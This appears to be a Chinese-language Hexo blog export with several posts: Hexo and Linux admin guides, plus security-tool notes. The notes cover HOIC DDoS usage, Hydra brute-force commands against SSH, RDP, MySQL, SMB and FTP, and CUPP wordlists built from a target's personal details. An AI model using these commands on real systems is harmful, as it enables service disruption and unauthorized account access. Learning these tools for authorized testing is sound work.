<h2 id="调整侧边栏顺序">调整侧边栏顺序</h2>
<p>调整<code>sort_order</code>大小即可，数字越大越前，要把公告后的卡片都加上数字（有的资料说是越小越前，但是我测试不是，反正能用就行）</p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hoic高射炮工具</title>
    <url>/2025/06/22/hoic%E9%AB%98%E5%B0%84%E7%82%AE%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="安装">安装</h2>
<p>下载地址：</p>
<blockquote>
<p><a href="https://sourceforge.net/projects/high-orbit-ion-cannon/">https://sourceforge.net/projects/high-orbit-ion-cannon/</a><br>
官网报有可能有恶意文件，理论上黑客软件很正常会有这个提示，但是看选择是否下载</p>
</blockquote>
<h2 id="使用">使用</h2>
<ol>
<li>解压后运行exe</li>
<li>选择<code>+号</code>添加url</li>
<li>可选择脚本第一个为伪造来源，后面的可以试试</li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>网络安全</tag>
        <tag>hoic</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客安装方法</title>
    <url>/2024/07/31/hexo%E5%8D%9A%E5%AE%A2%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="termux">termux</h2>
<h3 id="termux安装准备">termux安装准备</h3>
<p>pkg换源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@&#x27; $PREFIX/etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">pkg update</span><br><span class="line"></span><br><span class="line">pkg install nodejs-lts</span><br><span class="line">pkg install git</span><br><span class="line">pkg install vim</span><br></pre></td></tr></table></figure>
<p>需要在目录下运行安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir hexo</span><br><span class="line">chmod 777 hexo</span><br><span class="line">cd hexo</span><br></pre></td></tr></table></figure>
<h3 id="hexo">hexo</h3>
<p>npm换源（淘宝）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npmmirror.com</span><br></pre></td></tr></table></figure>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>
<p>启动命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<h3 id="主题">主题</h3>
<p>下载主题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure>
<p>vim编辑根目录下_config.yml中的theme：butterfly<br>
vim themes/butterfly/_config.yml</p>
<p>安装插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>
<h3 id="自定义样式">自定义样式</h3>
<p>都通过修改文件themes/butterfly/_config.yml中的模块，根据相关备注修改模块。</p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hydra命令</title>
    <url>/2024/08/01/hydra%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="参数详解">参数详解</h2>
<pre><code>-l login 小写，指定用户名进行破解
-L file 大写，指定用户的用户名字典
-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典
-P file 大写，用于指定密码字典
-s PORT 指定默认端口
-C使用冒号分割格式，例如“登录名:密码”来代替 -L/-P 参数
-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探
-M file 指定目标ip列表文件，批量破解
-o file 指定结果输出文件
-f 找到第一对登录名或者密码的时候中止破解
-t tasks 同时运行的线程数，默认是16
-S大写，采用SSL链接
-w time 设置最大超时时间，单位
-v / -V 显示详细过程
-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）
-x 自定义密码
</code></pre>
<h2 id="爆破协议举例">爆破协议举例</h2>
<p>SSH暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t -vV -o ssh.log -e ns IP ssh
</code></pre>
<p>mysql暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t 5 IP mysql
</code></pre>
<p>远程桌面暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t 1 IP rdp
</code></pre>
<p>使用hydra破解ssh的密码</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -o ssh.log -e ns IP ssh
</code></pre>
<p>破解https：</p>
<pre><code>hydra -m /index.php -l 用户名 -P 密码字典 IP https
</code></pre>
<p>破解teamspeak：</p>
<pre><code>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
</code></pre>
<p>破解cisco：</p>
<pre><code>hydra -P 用户字典 IP cisco
hydra -m cloud -P 密码字典 IP cisco-enable
</code></pre>
<p>破解smb：</p>
<pre><code>hydra -l administrator -P 密码字典 IP smb
</code></pre>
<p>破解pop3：</p>
<pre><code>hydra -l (muts)用户名 -P 密码字典 my.pop3.mail pop3
</code></pre>
<p>破解rdp：</p>
<pre><code>hydra IP rdp -l administrator -P 密码字典 -V
</code></pre>
<p>破解http-proxy：</p>
<pre><code>hydra -l admin -P 密码字典 http-proxy://127.0.0.1
</code></pre>
<p>破解telnet</p>
<pre><code>hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V
</code></pre>
<p>破解ftp：</p>
<pre><code>hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
</code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>java-linux安装卸载</title>
    <url>/2025/02/21/java-linux%E5%88%87%E6%8D%A2%E5%AE%89%E8%A3%85%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="下载jdk">下载jdk</h2>
<ol>
<li>更新</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>下载<br>
默认jdk</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install default-jdk</span><br></pre></td></tr></table></figure>
<p>指定版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure>
<h2 id="切换版本">切换版本</h2>
<ol>
<li>如果安装了多个java版本，查看的命令是</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --list java</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>切换的命令是</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure>
<blockquote>
<p>根据需要填写编号即可。</p>
</blockquote>
<h2 id="卸载">卸载</h2>
<h3 id="查看已有版本">查看已有版本</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg --list | grep -i &quot;jdk\|jre\|java&quot;</span><br></pre></td></tr></table></figure>
<h3 id="卸载命令">卸载命令</h3>
<ol>
<li>卸载</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt purge openjdk-11-jdk openjdk-11-jre</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>删除多余残余设置</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt autoremove</span><br><span class="line">sudo apt clean</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
        <category>环境</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>字典生成工具</title>
    <url>/2025/02/21/kali-cupp%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>kali有很多字典生成工具，这里主要说cupp这个工具，他是一款社交工程学字典生成工具，可以根据目标用户的个人信息生成定制的密码字典，</p>
<h2 id="cupp">cupp</h2>
<h3 id="使用方法">使用方法</h3>
<p>输入命令根据提示输入提示词即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
<h3 id="翻译">翻译</h3>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&gt; First Name: </span><br><span class="line">名字：目标的名字</span><br><span class="line">&gt; Surname: </span><br><span class="line">姓：目标的姓氏</span><br><span class="line">&gt; Nickname: </span><br><span class="line">昵称：目标的常用昵称或别名</span><br><span class="line">&gt; Birthdate (DDMMYYYY): </span><br><span class="line">出生日期：目标的出生日期，格式为日月年（DDMMYYYY）</span><br><span class="line">&gt; Partners) name:</span><br><span class="line">伴侣的名字</span><br><span class="line">&gt; Partners) nickname:</span><br><span class="line">伴侣的昵称：</span><br><span class="line">&gt; Partners) birthdate (DDMMYYYY):</span><br><span class="line">伴侣的出生日期（DDMMYYYY）</span><br><span class="line">&gt; Child&#x27;s name:</span><br><span class="line">孩子的名字：</span><br><span class="line">&gt; Child&#x27;s nickname:</span><br><span class="line">孩子的昵称：</span><br><span class="line">&gt; Child&#x27;s birthdate (DDMMYYYY):</span><br><span class="line">孩子的出生日期（DDMMYYYY）：</span><br><span class="line">&gt; Pet&#x27;s name:</span><br><span class="line">宠物的名字：</span><br><span class="line">&gt; Company name:</span><br><span class="line">公司名字：</span><br><span class="line">&gt; Do you want to add some key words about the victim? Y/[N]: y</span><br><span class="line">是否要添加一些关于目标的关键词？Y/[N]：y</span><br><span class="line">&gt; Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed:</span><br><span class="line">请输入单词，用逗号分隔。[例如：hacker,juice,black]，空格将被移除：</span><br><span class="line">&gt; Do you want to add special chars at the end of words? Y/[N]: y</span><br><span class="line">是否要在单词末尾添加特殊字符？Y/[N]：y</span><br><span class="line">&gt; Do you want to add some random numbers at the end of words? Y/[N]:y</span><br><span class="line">是否要在单词末尾添加一些随机数字？Y/[N]：y</span><br><span class="line">&gt; Leet mode? (i.e. leet = 1337) Y/[N]:</span><br><span class="line">是否启用“Leet 模式”？（例如：leet = 1337）Y/[N]：</span><br></pre></td></tr></table></figure>
<blockquote>
<p>是否启用“Leet 模式”？（例如：leet = 1337）<br>
如果选择 Y，CUPP 会将单词中的某些字母替换为数字或特殊字符，以生成“Leet Speak”（1337 语言）。<br>
例如：<br>
a 替换为 4<br>
e 替换为 3<br>
i 替换为 1<br>
o 替换为 0<br>
s 替换为 5<br>
t 替换为 7<br>
例如，单词 password 会被替换为 p@ssw0rd 或 p@ssw0rd7 等。</p>
</blockquote>
<h2 id="其他">其他</h2>
<h3 id="SocialEngineeringDictionaryGenerator">SocialEngineeringDictionaryGenerator</h3>
<p>下载<code>index.html</code>打开即可使用；</p>
<blockquote>
<p>来自CN-SEC中文网:<br>
<a href="https://cn-sec.com/archives/2202717.html">https://cn-sec.com/archives/2202717.html</a></p>
</blockquote>
<blockquote>
<p>项目地址：<br>
<a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p>
</blockquote>
<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>注：工具仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任。</p>
</div>]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>cupp</tag>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-代理设置方法</title>
    <url>/2025/02/08/linux-%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="centos">centos</h2>
<h3 id="临时">临时</h3>
<p>通过以下命令实现临时使用代理服务器：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export https_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export ftp_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export no_proxy=&quot;localhost, 127.0.0.1, ::1&quot;</span><br></pre></td></tr></table></figure>
<h3 id="永久">永久</h3>
<p>通过修改profile文件实现：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure>
<p>末尾添加以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export https_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export ftp_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export no_proxy=&quot;localhost, 127.0.0.1, ::1&quot;</span><br></pre></td></tr></table></figure>
<p>执行生效命令即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>
<h2 id="kali">kali</h2>
<p>使用proxychains4代理，与上述类似，安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install proxychains4</span><br></pre></td></tr></table></figure>
<p>修改末尾的代理服务器端口即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
<p>使用方法是命令前加上proxychains4即可</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>网络代理</tag>
      </tags>
  </entry>
  <entry>
    <title>kali移动端（root安装，不改内核）</title>
    <url>/2024/10/15/kali/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>把kali安在移动端，不论部署了什么工具和环境，可以随处携带，操作不方便可以局域网电脑远程使用、vnc等等。以上是我的使用场景也是折腾的原因。</p>
<p>其实只有root的部分是最麻烦的，这个已经有很多教程了，可以慢慢看，建议先看手机的系统架构再看具体操作方法，不然在做什么都不知道。</p>
<p>原理这块极客湾Geekerwan我感觉是说的很好的一个老师，视频链接放下面了<br>
【玩机必看！带你入坑安卓刷机，小白也能看懂的ROOT基础指南来啦！】 <a href="https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&amp;vd_source=772102c618b4c4a14c10923aa0e26404">https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&amp;vd_source=772102c618b4c4a14c10923aa0e26404</a></p>
<h2 id="前提">前提</h2>
<p>肯定是需要现有一部root的手机，这个可以看我oppo root的帖子或者网上找相应方法去操作。<br>
然后能科学上网，这个其实没有也没关系，但是会比较方便。<br>
使用的是面具安装。</p>
<h2 id="下载镜像">下载镜像</h2>
<p>bing搜索kali，点击下载</p>
<p><img src="/images/pasted-64.png" alt="upload successful"></p>
<p>点击移动端，mobile</p>
<p><img src="/images/pasted-65.png" alt="upload successful"></p>
<p>点击full的版本，因为我这个没有对应的手机，所以下载的是图中位置的镜像</p>
<p><img src="/images/pasted-67.png" alt="upload successful"></p>
<h2 id="安装">安装</h2>
<p>在面具里面点击图中的本地安装，找到下载的镜像包，安装就是了<br>
<img src="/images/pasted-70.png" alt="upload successful"></p>
<p>安装之后其实一切都安装好了，据说官方支持的root机会自动下载好关键的三个软件，但是我这个瞎搞的root机，没有下载，后来发现官网下载镜像那里有个软件商店可以下载。<br>
<img src="/images/pasted-72.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>手机搞机</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>手机root</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下载离线安装包</title>
    <url>/2025/01/13/linux%E4%B8%8B%E8%BD%BD%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E5%8C%85/</url>
    <content><![CDATA[<h2 id="centos">centos</h2>
<p>以wget为例，需要先下载yum-utils，再下载安装包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install yum-utils</span><br><span class="line">yumdownloader wget</span><br></pre></td></tr></table></figure>
<p>选择保存位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yumdownloader --destdir=/root wget</span><br></pre></td></tr></table></figure>
<p>该命令网上说也能下载，查了下说是本机如果安装了该软件则不会下载<br>
yum install --downloadonly --downloaddir=/root wget</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>linux硬盘分区挂载和扩容</title>
    <url>/2025/01/15/linux%E6%89%A9%E5%AE%B9%E7%A1%AC%E7%9B%98/</url>
    <content><![CDATA[<h2 id="分区和挂载">分区和挂载</h2>
<h3 id="非逻辑分区和挂载">非逻辑分区和挂载</h3>
<h4 id="先将空闲磁盘通过fdisk分区">先将空闲磁盘通过fdisk分区</h4>
<p>命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb </span><br><span class="line">依次选择	n/p/n/回车默认/+size&#123;K,M,G&#125;</span><br></pre></td></tr></table></figure>
<p>帮助</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>
<h4 id="挂载">挂载</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化</span><br><span class="line">mkfs.ext4 /dev/sdb1</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/mydisk</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/sdb1 /mnt/mydisk</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/mydisk</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="逻辑卷及挂载">逻辑卷及挂载</h3>
<p>首先和上步一样，使用fdisk创建一个分区/dev/sdb1</p>
<h4 id="创建物理卷（PV）">创建物理卷（PV）</h4>
<p>将新创建的分区转化成物理卷，主要是添加LVM属性信息并划分PE存储单元，多个一起设置 pvcreate /dev/sdb{1,2,3,4,5}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br></pre></td></tr></table></figure>
<h4 id="创建卷组（VG）">创建卷组（VG）</h4>
<p>创建卷组vgtest ,并将刚才创建好的物理卷加入该卷组.默认PE大小为4MB,PE是卷组的最小存储单元.可以通过 –s参数修改大小。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br></pre></td></tr></table></figure>
<h4 id="创建逻辑卷（LV）">创建逻辑卷（LV）</h4>
<p>创建逻辑卷，将卷组vgtest上面分割4G给新的逻辑卷lvtest1，将卷组vgtest上剩余空间分配给新的逻辑卷lvtest2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>
<h4 id="挂载-2">挂载</h4>
<p>和非逻辑分区挂载方式一样，先格式化再挂载目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化(文件系统)</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest01</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest02</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/test</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/vgtest/lvtest01 /mnt/test</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="分区扩容">分区扩容</h2>
<h3 id="非逻辑分区">非逻辑分区</h3>
<p>两种情况，一种是已经分区的扩容然后盘还有空间扩容，一种是未分区使用整个磁盘的需要扩容。第二种其实算是第一种的后半部分。</p>
<h4 id="已分区扩容">已分区扩容</h4>
<p>以/dev/sdb1为例子，使用了5G大小，盘总共10G，sdb1需要扩容为10G。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、解除挂载</span><br><span class="line">umount /mnt/test</span><br><span class="line">2、调整分区大小</span><br><span class="line">parted /dev/sdb</span><br><span class="line">resizepart 1（回车然后输入大小，可以是%，也可以直接指定大小，需要加上单位）</span><br><span class="line">quit</span><br><span class="line">3、重新识别大小</span><br><span class="line">resize2fs /dev/sdb1</span><br><span class="line">4、重新挂载即可</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>
<h4 id="未分区扩容">未分区扩容</h4>
<p>使用整个磁盘大小，在原基础磁盘上扩容磁盘后调整，相当于不需要重新调整分区大小，直接重新识别即可，一般在虚拟环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resize2fs /dev/sdb1</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="逻辑分区">逻辑分区</h3>
<p>总体是将新物理卷扩容到卷组，然后将卷组空间分配给已有逻辑卷中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb2</span><br><span class="line">vgextend vgtest /dev/sdb2</span><br><span class="line">lvextend -l +100%FREE  /dev/mapper/vgtest-lvtest01</span><br></pre></td></tr></table></figure>
<p>最后重新挂载即可，可以将-l改成-L指定磁盘大小</p>
<p>让文件系统占满 LV 的全部 18 GB</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo resize2fs /dev/mapper/vgtest-lvtest01</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以用<code>lvdisplay</code>查看名称</p>
</blockquote>
<hr>
<h2 id="删除分区操作">删除分区操作</h2>
<p>命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="开机自动挂载">开机自动挂载</h2>
<p>通过df -h查看文件系统名称，然后修改/etc/fstab最后一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/dev/mapper/vgtest-lvtest01     /mnt/test        ext4    defaults        0 0</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>硬盘分区</tag>
        <tag>分区扩容</tag>
      </tags>
  </entry>
  <entry>
    <title>linux常见场景排查</title>
    <url>/2025/06/22/linux%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF%E6%8E%92%E6%9F%A5/</url>
    <content><![CDATA[<h3 id="0-通用排查原则和日志表格">0. 通用排查原则和日志表格</h3>
<ul>
<li>确定现象：确定是性能问题、磁盘满、服务挂掉、疑似入侵。</li>
<li>收集证据：保存日志片段、采集性能状态。</li>
<li>定位问题：确定是 CPU、MEM、IO、磁盘、配置或安全。</li>
<li>解决验证：修改配置、重启服务、应用安全措施。</li>
<li>完成记录：保存排查记录。</li>
</ul>
<table>
<thead>
<tr>
<th><strong>日志类别</strong></th>
<th><strong>日志文件/目录</strong></th>
<th><strong>说明</strong></th>
<th><strong>典型发行版</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>系统日志</strong></td>
<td><code>/var/log/syslog</code></td>
<td>系统事件和服务日志（多信息汇总）</td>
<td>Debian/Ubuntu</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/messages</code></td>
<td>系统和内核信息日志</td>
<td>RHEL/CentOS/Fedora</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/dmesg</code></td>
<td>内核环缓冲区日志，启动硬件信息</td>
<td>通用</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/kern.log</code></td>
<td>内核日志</td>
<td>Debian/Ubuntu</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/boot.log</code></td>
<td>启动过程日志</td>
<td>通用</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/cron</code></td>
<td>定时任务日志</td>
<td>通用</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/lastlog</code></td>
<td>所有用户的最后登录时间</td>
<td>通用</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/wtmp</code></td>
<td>登录/注销记录，<code>last</code> 命令查看</td>
<td>通用</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/btmp</code></td>
<td>失败的登录尝试记录，<code>lastb</code> 查看</td>
<td>通用</td>
</tr>
<tr>
<td><strong>安全认证日志</strong></td>
<td><code>/var/log/auth.log</code></td>
<td>认证、登录、sudo操作日志</td>
<td>Debian/Ubuntu</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/secure</code></td>
<td>认证、登录、sudo操作日志</td>
<td>RHEL/CentOS/Fedora</td>
</tr>
<tr>
<td><strong>审计日志</strong></td>
<td><code>/var/log/audit/audit.log</code></td>
<td>auditd 审计日志，系统调用、安全事件</td>
<td>需要安装 auditd</td>
</tr>
<tr>
<td><strong>系统服务</strong></td>
<td><code>journalctl</code>（无固定日志文件，使用系统日志管理）</td>
<td>系统服务日志</td>
<td>通用</td>
</tr>
</tbody>
</table>
<ul>
<li>Linux 常见的应用程序日志目录和文件</li>
</ul>
<table>
<thead>
<tr>
<th><strong>应用类型</strong></th>
<th><strong>应用名称</strong></th>
<th><strong>日志文件或目录</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Web服务器</strong></td>
<td>Apache HTTP Server</td>
<td><code>/var/log/apache2/</code>（Ubuntu/Debian）<br><code>/var/log/httpd/</code>（CentOS/RHEL）</td>
<td>访问日志 <code>access.log</code>，错误日志 <code>error.log</code></td>
</tr>
<tr>
<td></td>
<td>Nginx</td>
<td><code>/var/log/nginx/</code></td>
<td>访问日志 <code>access.log</code>，错误日志 <code>error.log</code></td>
</tr>
<tr>
<td><strong>数据库</strong></td>
<td>MySQL / MariaDB</td>
<td><code>/var/log/mysql/</code><br><code>/var/log/mariadb/</code></td>
<td>查询日志、错误日志等</td>
</tr>
<tr>
<td><strong>邮件服务器</strong></td>
<td>Postfix</td>
<td><code>/var/log/mail.log</code> 或 <code>/var/log/maillog</code></td>
<td>邮件发送接收日志</td>
</tr>
<tr>
<td></td>
<td>Exim</td>
<td><code>/var/log/exim4/</code>（Debian系）</td>
<td>邮件日志</td>
</tr>
<tr>
<td></td>
<td>Dovecot</td>
<td><code>/var/log/dovecot.log</code></td>
<td>邮件服务器日志</td>
</tr>
<tr>
